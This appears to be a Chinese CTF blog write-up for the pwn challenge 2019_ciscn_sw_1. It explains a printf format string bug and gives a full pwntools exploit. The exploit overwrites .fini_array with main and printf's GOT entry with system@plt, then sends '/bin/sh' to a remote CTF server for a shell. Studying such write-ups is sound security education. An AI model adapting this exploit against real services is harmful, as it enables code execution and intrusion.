---
title: 2019_ciscn_sw_1
date: 2022-03-10 20:01:42
tags:
    - 格式化字符串
---

<!--more-->

# 2019_ciscn_sw_1

国赛的一道格式化字符串漏洞

![image-20220310173215088](https://s2.loli.net/2022/03/26/5BO7olDqTSdEzeI.png)

进入IDA可以看到printf（format）存在格式化字符串漏洞，但是一般情况下利用格式化字符串printf()是需要两次的，但是这里只有一次，所以需要让程序进行多次运行。



在Linux下的程序运行如下图所示

![image-20220310173559981](https://s2.loli.net/2022/03/26/TeIWQSaYKJ8XiDp.png)

main()函数并不是第一个执行的函数，当程序准备退出的时候会执行finiarray()这个函数，这个函数我们可以直接IDA使用“ctrl+s”查看

![image-20220310173745111](https://s2.loli.net/2022/03/26/Tl2JX3iItdK8sbY.png)

![image-20220310173818518](https://s2.loli.net/2022/03/26/wWEU6xQI4PTfr8n.png)

当我们把这个函数覆盖成main()函数的时候，那么程序会在退出的时候再执行main（）函数

大概运行流程

```
_start-->_libc_start_main-->init-->.init_arry[0]-->.init_arry[1]-->……-->.init_arry[n]-->main-->fini-->.fini_array[n]-->.fini_array[n-1]-->……-->.fini_array[0]
```

这道题大致意思就是把fini覆盖成main函数，第一次覆盖，第二次上传payload

## EXP

```
from pwn import *
context.log_level='debug'
context.arch='i386'
#p=process('./ciscn_2019_sw_1')
p=remote("node4.buuoj.cn",26890)
elf=ELF('./ciscn_2019_sw_1')

main_addr=elf.symbols['main']
printf_got=elf.got['printf']
system_plt=elf.plt['system']#把sys的plt表覆盖到printf上
fini_array=0x0804979C

main_addr_low=(main_addr)&0xffff
main_addr_high=(main_addr>>16)&0xffff
system_plt_low=system_plt&0xffff
system_plt_high=(system_plt>>16)&0xffff

payload=p32(fini_array)+p32(fini_array+2)+p32(printf_got)+p32(printf_got+2)#因为是32位程序，所以把要覆盖的地址写前面
payload+='%'+str(main_addr_low-16)+'c%4$hn'+'%'+str(0x10000-main_addr_low+main_addr_high)+'c%5$hn'#这里main高低位可以去ida直接查看大小，位移4是计算printf位移得出
payload+='%'+str(system_plt_low-main_addr_high)+'c%6$hn'+'%'+str(0x10000-system_plt_low+system_plt_high)+'c%7$hn'#同上理


p.recvuntil('name?\n')
p.sendline(payload)
p.recvuntil('name?\n')
p.sendline('/bin/sh\x00')#覆盖printf后此时printf（）相当于system()
p.interactive()
```

![image-20220326151117344](https://s2.loli.net/2022/03/27/hoLbUQjcvVGsJ6l.png)

